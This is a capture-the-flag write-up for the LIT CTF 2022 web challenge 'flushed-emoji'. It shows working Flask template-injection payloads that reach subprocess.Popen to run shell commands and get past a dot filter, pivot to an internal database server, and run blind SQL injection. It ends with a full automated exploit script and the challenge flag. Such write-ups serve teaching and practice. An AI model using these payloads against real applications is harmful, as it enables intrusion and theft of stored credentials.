---
title: flushed-emoji Writeup
date: 2022-07-26
excerpt: Writeup for flushed-emoji, a web challenge in LIT CTF 2022.
tags:
    - web
    - ssti
    - sqli
    - lit-ctf-2022
---

# flushed-emoji Writeup

## Description

> Flushed emojis are so cool! Learn more about them [here](http://litctf.live:31781/)!

Files:

- [FlushedEmojis.zip](https://drive.google.com/uc?export=download&id=1agW3a0-T4VsSJwJVTZ-dWSRLE_byxJya)

The site is a simple site that "infects" us with a virus when we click a button. It asks us for our username and password and then displays our password, saying we got "hacked."

## Examining Source

When I started the challenge, I first located the flag in a SQLite database on another server. Whenever we submit our username and password, the server makes a request to that server to check if the username and password are in the database.

Unfortunately, we don't have the other server's IP but, somehow, we need to access it by making a request on the main server.

### Finding the Vulnerabilities

When I opened `main-server/main.py`, the first thing that stuck out to me was the processing for a `POST` request on the `/` endpoint:

```python=16
    username = request.form['username']
    password = request.form['password']

  
    if('.' in password):
      return render_template_string("lmao no way you have . in your password LOL");

    r = requests.post('[Other server IP]', json={"username": alphanumericalOnly(username),"password": alphanumericalOnly(password)}); 
    print(r.text);
    if(r.text == "True"):
      return render_template_string("OMG you are like so good at guessing our flag I am lowkey jealoussss.");
    return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");
```

As we can see, the endpoint returns Flask's `render_template_string()` function with the unescaped "password." To me, this signals that we will need to exploit a server-side template injection vulnerability.

On the database side, we have one endpoint, `/runquery`:

```python=18
@app.route('/runquery', methods=['POST'])
def runquery():
  request_data = request.get_json()
  username = request_data["username"];
  password = request_data["password"];

  print(password);
  
  cur.execute("SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'");

  rows = cur.fetchall()
  if(len(rows) > 0):
    return "True";
  return "False";
```

On line 26, we can see that a SQL query is made with unescaped user data. Under normal circumstances, the main server would ensure the user input is alphanumeric by calling `alphanumericalOnly()`; however, if we can somehow get an unescaped username and password, we would be able to do SQL injection.

## Server-Side Template Injection

The first step to our exploit is to find the IP address of the database server. To do so, we can use server-side template injection (SSTI).

As we can recall, the server renders the unescaped password. Being able to render unescaped user input is extremely dangerous ⁠— templating engines are very powerful, and if an attacker can render arbitrary templates, they may have the capacity for remote code execution.

I started by submitting the form with the following payload as the password:

```python
{{ ''['__class__']['__mro__'][1] }}
```

The `__mro__` attribute gets the `string` class's method resolution order, which is usually used to properly get the methods and attributes of an object. This is useful to us since it is a list that contains `string`'s superclass, `object`, which all classes inherit from. Since all classes inherit from `object`, we can call its `['__subclasses__']()`  method to get a list of all the classes that are available:

![{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}](https://i.imgur.com/P7hwoTG.png)

One of those classes is `subprocess.Popen`, which lets us run shell commands. During the competition, I found that the index of the class fluctuated between index 247 and 250; however, at the time of writing, it is located at index 250. By using the `subprocess.Popen` class, we can instantiate an object of the `Popen` class and communicate the output to get a psuedo-shell.

For example, to run the `ls` command, we can use a payload like this:

```python
{{ ''['__class__']['__mro__'][1]['__subclasses__']()[250](['ls'], stdout=-1)['communicate']() }}
```

However, this still has a slight pitfall: we can't use `.` characters. This means that it's a bit trickier to do `cat main.py`, for example. To bypass that, we can represent the `.` charcters in our payload in hex, which lets us write them using `\x2e`.

Now we can create a payload to print out the contents of `main.py` to get the IP address of the database[^1]:

```
{{ ''['__class__']['__mro__'][1]['__subclasses__']()[250](['cat', 'main\x2epy'], stdout=-1)['communicate']() }}
```

This prints out the contents of the server's copy of `main.py` with the database server's URL, `http://172.24.0.8:8080`, embedded in the file. 

Unfortuately, we can't make requests to that server from our local machines because it is a private address. Luckily for us, having an SSTI vulnerability means we have RCE; we can make requests to the database server from the main server by using Python's `requests` module. If we send this command as an argument to `python3 -c`, we can make a GET request to the server:

```python
import requests as r; print(r.get('http://172.24.0.8:8080/runquery', json={ 'username': 'myusername', 'password': 'mypassword' }).text)
```

Note that we still need to represent the `.` characters in the Python command as hex. Because the command string is wrapped in `'` (to execute the command), I also represented `'` characters in hex.

```
{{ ''['__class__']['__mro__'][1]['__subclasses__']()[250](['python3', '-c', 'import requests as r; print(r\x2epost(\x27http://172\x2e24\x2e0\x2e8:8080/runquery\x27, json={ \x27username\x27: \x27myusername\x27, \x27password\x27: \x27mypassword\x27 })\x2etext)'], stdout=-1)['communicate']() }}
```

We can confirm this works by seeing if the server sends us a "False" value in place of our password:

![SSTI requests Payload](https://i.imgur.com/cq1CJJA.png)

## Blind SQL Injection

Now that we know how we can make arbitrary requests to the database server, we can now do SQL injection on the database.

```python=26
  cur.execute("SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'");

  rows = cur.fetchall()
  if(len(rows) > 0):
    return "True";
  return "False";
```

Making a request to `/runquery` will only return a True value (if our query returns a row) or a False value (if it does not return a row). While this doesn't actually return what those rows contain, we can still extract information from these queries by using blind SQLi.

We can extract each character from the flag user's password with a request with the username set to nothing the password set to `' OR (SUBSTR(password, n, 1) = 'char`, where n is the nth character in the password and char is any character that we want to check.

This results in the following SQL query being executed on the server:

```sql
SELECT * FROM users WHERE username='' AND password='' OR (SUBSTR(password, n, 1) = 'char';
```

This query returns a row if the nth character in the password is equal to the given char. If we run the same query, only changing char to a different letter each time, we would only get one query that results in True. That character would be the correct character in that spot in the password.

For example, given that the password is `LITCTF{test}` and we want to find the 2nd letter in the password, the following password would return True, whereas substituting `I` for any other letter would return False:

```
' OR (SUBSTR(password, 2, 1) = 'I')--
```

We can use this method to leak all of the letters of the flag. I wrote a script to automate this process for me:

```python3=1
from requests import Session

s = Session()

injection = """{{ ''['__class__']['__mro__'][1]['__subclasses__']()[250]([%s], stdout=-1)['communicate']() }}"""

alphabet = '!@#$%^&*()?,.abcdefghijklmnopqrstuvwxyz0123456789}_'

found = 'LITCTF{'

it = len(found) + 1

while not found.endswith('}'):
    for letter in alphabet:
        try:
            print(found, letter, sep=':')
            command = ['python3', '-c', f"""import requests as r; print(r.post('http://172.24.0.8:8080/runquery', json={{'username': 'flag', "password": "' OR SUBSTR((SELECT password FROM users), {it}, 1) = '{letter}"}}).text)"""]
            c = ', '.join(['\'' + ''.join('\\' + hex(ord(y))[1:] if y == '.' or y == '\'' else y for y in x) + '\'' for x in command])
            i = injection % c

            t = s.post('http://litctf.live:31781', data={'username': 'ok', 'password': i }).text

            if 'True' in t:
                found += letter
                print(found)
                it += 1
                break
        except Exception as e:
            if 'Connection aborted' in str(e):
                print('Skipped ' + letter)
                continue
```

## Flag

```
LITCTF{flush3d_3m0ji_o.0}
```

## Final Notes

Exploiting an SSTI's RCE capabilities to make a server-side request to an API was something I hadn't considered before, and, overall, the challenge was extremely enjoyable to do. Kudos to the author!

[^1]:If sending this payload in Python, remember to escape the backslash(es) when sending the hex representations of the character(s).